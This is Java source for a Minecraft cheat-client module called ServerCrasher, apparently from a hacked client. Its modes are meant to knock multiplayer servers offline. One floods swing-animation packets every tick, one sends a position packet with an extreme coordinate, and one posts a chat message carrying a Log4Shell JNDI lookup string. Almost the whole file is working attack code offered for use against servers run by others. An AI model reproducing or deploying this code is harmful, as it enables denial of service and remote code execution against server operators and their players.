package com.netease.mc.modSS.mod.mods.CLIENT;

import com.netease.mc.modSS.setting.*;
import com.netease.mc.modSS.mod.*;
import net.minecraftforge.fml.common.gameevent.*;
import com.netease.mc.modSS.utils.*;
import net.minecraft.network.*;
import net.minecraft.network.play.client.*;

public class ServerCrasher extends Mod
{
    public Setting mode;
    
    public ServerCrasher() {
        super("ServerCrasher", "", Category.CLIENT);
        this.addSetting(this.mode = new Setting("Mode", this, "Swing", new String[] { "Swing", "Log4j", "AAC5" }));
    }
    
    @Override
    public void onEnable() {
        if (this.mode.isMode("Log4j")) {
            final String str = "${jndi:ldap://192.168.${RandomUtils.nextInt(1,253)}.${RandomUtils.nextInt(1,253)}}";
            ServerCrasher.mc.thePlayer.sendChatMessage("/ ${jndi:rmi://localhost:3000}");
            this.toggle();
        }
        super.onEnable();
    }
    
    @Override
    public void onClientTick(final TickEvent.ClientTickEvent event) {
        final String mode = this.mode.getMode();
        switch (mode) {
            case "Swing": {
                Wrapper.INSTANCE.sendPacket((Packet)new C0APacketAnimation());
                break;
            }
            case "AAC5": {
                Wrapper.INSTANCE.sendPacket((Packet)new C03PacketPlayer.C04PacketPlayerPosition(1.7E301, -999.0, 0.0, true));
                break;
            }
        }
        super.onClientTick(event);
    }
}
